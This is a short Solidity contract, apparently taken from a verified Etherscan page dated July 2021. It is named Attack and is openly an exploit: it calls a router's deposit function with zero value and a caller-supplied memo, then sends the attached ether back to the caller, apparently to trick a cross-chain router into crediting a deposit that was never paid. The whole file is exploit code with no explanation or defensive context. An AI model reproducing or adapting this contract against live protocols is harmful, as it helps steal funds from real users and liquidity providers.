/**
 *Submitted for verification at Etherscan.io on 2021-07-24
*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.3;

interface IRouter {
    function deposit(
        address payable vault,
        address asset,
        uint256 amount,
        string memory memo
    ) external payable;
}

contract Attack {
    function attack(
        address router,
        address payable vault,
        string memory memo
    ) external payable {
        IRouter(router).deposit{value: 0}(vault, address(0), 0, memo);
        payable(msg.sender).transfer(msg.value);
    }
}